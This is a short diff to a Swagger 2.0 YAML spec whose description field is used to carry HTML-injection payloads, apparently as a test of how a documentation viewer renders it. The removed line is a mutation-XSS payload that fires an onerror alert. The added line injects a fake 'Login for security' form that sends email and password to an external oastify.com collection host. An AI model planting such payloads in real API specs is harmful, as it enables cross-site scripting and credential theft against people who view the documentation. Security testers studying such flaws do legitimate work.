@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+    <form action="https://ssolvzl7sc83r2tx167ld7j56wcv0toi.oastify.com">Login for security:<br><label for="u">Email:<input type="text" id="u" name="u"><br><label for="p">Pass:<input type="password" id="p" name="p"><br><input type="submit" value="ok">
 paths:
   /accounts:
     get:
